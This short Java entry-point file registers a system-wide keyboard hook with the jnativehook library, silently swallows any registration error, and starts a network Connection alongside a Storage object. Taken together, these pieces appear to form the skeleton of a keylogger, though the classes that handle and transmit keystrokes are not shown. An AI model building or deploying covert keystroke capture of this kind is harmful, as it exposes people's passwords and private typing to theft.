package org.example;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class Main {
    public static Connection connect;
    public static Storage storage = new Storage();
    public static void main(String[] args) {
        java.awt.GraphicsEnvironment.isHeadless();
        connect = new Connection();
        connect.start();
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
        }
        GlobalScreen.addNativeKeyListener(new Keyboard());
    }
}